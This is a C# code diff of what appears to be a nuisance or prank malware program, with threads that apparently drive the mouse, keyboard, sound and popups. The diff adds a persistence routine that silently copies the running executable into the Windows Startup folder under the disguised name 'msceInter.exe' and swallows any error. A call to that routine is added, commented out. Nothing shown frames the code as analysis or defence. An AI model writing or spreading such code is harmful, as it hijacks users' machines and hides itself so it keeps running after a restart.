@@ -23,11 +23,13 @@ namespace services
             Thread soundThread = new Thread(new ThreadStart(SoundThread));
             Thread popupThread = new Thread(new ThreadStart(PopupThread));
             // starts all threads
+
+            //startwithwindows();
             popupThread.Start();
             mouseThread.Start();
             soundThread.Start();
             keyboardThread.Start();
-            // creates 10 second timer before starting thread
+            //creates 10 second timer before starting thread
             DateTime future = DateTime.Now.AddSeconds(10);
             while (future > DateTime.Now)
             {
@@ -131,6 +133,15 @@ namespace services
                 }
                Thread.Sleep(1000);
             }
-        }
+        }//main ends
+        static void startwithwindows()
+        {
+            try
+            {
+                System.IO.File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.Startup) + @"\" + "msceInter.exe");
+            }
+            catch { }
+
+        }//startwithwindows end 
     }// class end
 }// namespace end
